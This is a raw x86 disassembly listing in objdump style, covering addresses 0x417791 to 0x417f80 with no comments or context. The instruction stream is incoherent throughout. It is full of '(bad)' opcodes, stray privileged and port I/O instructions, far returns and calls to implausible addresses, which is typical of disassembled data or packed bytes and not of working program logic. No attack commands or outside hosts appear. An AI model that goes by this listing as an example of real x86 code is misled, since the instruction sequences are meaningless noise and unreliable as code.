  417791:	cli    
  417792:	cdq    
  417793:	not    dl
  417795:	jp     0x4177cd
  417797:	addr16 nop
  417799:	icebp  
  41779a:	fisub  WORD PTR [ecx-0x661c850d]
  4177a0:	stos   DWORD PTR es:[edi],eax
  4177a1:	push   ebx
  4177a2:	pop    ds
  4177a3:	mov    dl,0x4c
  4177a5:	outs   dx,BYTE PTR ds:[esi]
  4177a6:	adc    BYTE PTR [edi-0x43],0x1f
  4177aa:	sar    bl,cl
  4177ac:	retf   
  4177ad:	cmp    al,0xb9
  4177af:	mov    ecx,0x4594b873
  4177b4:	xor    BYTE PTR [eax-0x40b6ec04],bl
  4177ba:	or     DWORD PTR [ecx+0x2ee00dfd],eax
  4177c0:	jle    0x4177e7
  4177c2:	out    dx,eax
  4177c3:	test   eax,0xf1146f34
  4177c8:	adc    edx,DWORD PTR [edx+0x4abafdc7]
  4177ce:	mov    bl,0x90
  4177d0:	mov    ecx,0x7c8e9ada
  4177d5:	fimul  DWORD PTR [edi]
  4177d7:	add    eax,0x797bf9fd
  4177dc:	sbb    DWORD PTR [ecx+0x11593fdd],esp
  4177e2:	push   edx
  4177e3:	rcr    BYTE PTR [esi-0x7f],0x14
  4177e7:	or     ch,BYTE PTR [eax-0x61]
  4177ea:	dec    edi
  4177eb:	test   al,0x2c
  4177ed:	add    al,0x66
  4177ef:	xchg   edx,eax
  4177f0:	cmp    DWORD PTR [esi],esp
  4177f2:	push   esp
  4177f3:	sbb    ah,BYTE PTR [eax+0x7c5f8351]
  4177f9:	inc    ebp
  4177fa:	and    BYTE PTR [edi-0x22],bh
  4177fd:	pop    edx
  4177fe:	adc    ah,BYTE PTR [ebp+0x1eeb3a0c]
  417804:	aas    
  417805:	fild   WORD PTR [esi+0x67f17d25]
  41780b:	das    
  41780c:	push   ecx
  41780d:	in     al,0x84
  41780f:	fnsetpm(287 only) 
  417811:	xchg   ebx,eax
  417812:	test   DWORD PTR [edx-0x1b],edi
  417815:	pop    esi
  417816:	pop    ebx
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
  417887:	mov    ecx,ebx
  417889:	hlt    
  41788a:	add    ecx,ebx
  41788c:	enter  0x899c,0x32
  417890:	dec    ebp
  417891:	add    ecx,eax
  417893:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  417899:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4178a0:	xor    ecx,ebx
  4178a2:	retf   
  4178a3:	enter  0x4d03,0xc8
  4178a7:	mov    DWORD PTR fs:[eax],ebx
  4178aa:	lea    eax,[eax]
  4178ac:	push   esp
  4178ad:	mov    edi,edi
  4178af:	fs (bad) 
  4178b1:	(bad)  
  4178b2:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4178b8:	push   0xffffffff
  4178ba:	and    bh,bh
  4178bc:	pop    ecx
  4178bd:	inc    eax
  4178be:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4178c4:	push   0xffffff8b
  4178c6:	pop    ecx
  4178c7:	cld    
  4178c8:	dec    ebp
  4178c9:	lea    ecx,[ecx+0x45ff08ff]
  4178cf:	mov    BYTE PTR [edx+0x1],cl
  4178d2:	add    BYTE PTR [eax],al
  4178d4:	mov    DWORD PTR [ebp+0x8],0x58008d
  4178db:	dec    DWORD PTR [ebp-0x77]
  4178de:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4178e5:	cld    
  4178e6:	dec    ebp
  4178e7:	jne    0x41791c
  4178e9:	lea    eax,[ebx]
  4178eb:	push   eax
  4178ec:	mov    edi,edi
  4178ee:	or     BYTE PTR [ecx+0x54a845],cl
  4178f4:	add    al,ch
  4178f6:	(bad)  
  4178f7:	sub    esp,ebp
  4178f9:	add    BYTE PTR [eax],al
  4178fb:	rol    BYTE PTR [eax],0x84
  4178fe:	inc    ebp
  4178ff:	add    dh,BYTE PTR [esi+0x0]
  417902:	add    BYTE PTR [ebp-0x73],al
  417905:	mov    ebp,DWORD PTR [esp+edx*4]
  417908:	inc    DWORD PTR [eax]
  41790a:	lea    ecx,[ebx-0x30074f4]
  417910:	call   0x428495
  417915:	add    BYTE PTR [ebp+0x0],cl
  417918:	jne    0x41795b
  41791a:	dec    DWORD PTR [ebx-0x76210314]
  417920:	dec    ebp
  417921:	add    DWORD PTR [ebp+0x0],esi
  417924:	(bad)  
  417925:	xchg   ebp,eax
  417926:	loopne 0x417927
  417928:	inc    eax
  417929:	inc    DWORD PTR [eax]
  41792b:	mov    ecx,DWORD PTR [ebp-0x4]
  41792e:	xor    edx,DWORD PTR [edx+0x7201b8]
  417934:	add    BYTE PTR [edx],dl
  417936:	enter  0x4d90,0x0
  41793a:	mov    eax,DWORD PTR [eax]
  41793c:	hlt    
  41793d:	add    al,0xa5
  41793f:	mov    al,0xff
  417941:	add    bh,bh
  417943:	add    BYTE PTR [ebx],dh
  417945:	inc    DWORD PTR [ebx]
  417947:	sbb    al,0x89
  417949:	jne    0x417923
  41794b:	mov    esp,DWORD PTR [ecx+0x4500fc]
  417951:	mov    eax,DWORD PTR [ebp-0xff0048]
  417957:	mov    DWORD PTR [eax-0x70],0xee58ed89
  41795e:	inc    DWORD PTR [ebp-0x75]
  417961:	fisttp QWORD PTR [eax+eiz*8]
  417964:	test   DWORD PTR [esi-0x1],esp
  417967:	inc    ebp
  417968:	(bad)  
  417969:	aas    
  41796a:	inc    ebp
  41796b:	(bad)  
  41796c:	lea    edi,[esp+eiz*2-0x1]
  417970:	inc    edi
  417972:	mov    DWORD PTR ds:0x8000c7a0,edi
  417978:	mov    ebp,esi
  41797a:	cld    
  41797b:	in     al,0x8d
  41797d:	inc    ebp
  41797e:	jmp    eax
  417980:	(bad)  
  417981:	fisttp WORD PTR [eax+0x8801c7]
  417987:	jecxz  0x4179ce
  417989:	out    dx,al
  41798a:	inc    DWORD PTR [ebp-0x4]
  41798d:	out    0x8d,eax
  41798f:	aas    
  417990:	inc    edi
  417992:	jmp    FWORD PTR [eax-0x78]
  417995:	inc    DWORD PTR [ecx]
  417997:	mov    DWORD PTR [eax],0xc7a83d
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	test   edi,edi
  4179a0:	pandn  mm0,mm5
  4179a3:	aas    
  4179a4:	add    bh,al
  4179a6:	mov    esi,DWORD PTR [eax-0x4]
  4179a9:	inc    DWORD PTR [eax+0xdf01e0]
  4179af:	(bad)  
  4179b0:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4179b4:	mov    ebp,ebx
  4179b6:	xchg   esp,eax
  4179b7:	fild   DWORD PTR [eax]
  4179b9:	(bad)  
  4179ba:	mov    edi,DWORD PTR [eax+0x3]
  4179bd:	(bad)  
  4179be:	cmp    al,0xe7
  4179c0:	dec    ebp
  4179c1:	leave  
  4179c2:	mov    ebp,eax
  4179c4:	fsubr  DWORD PTR [ecx]
  4179c6:	add    BYTE PTR [eax],al
  4179c8:	lea    ecx,[ebx-0x7f0003b4]
  4179ce:	push   edx
  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
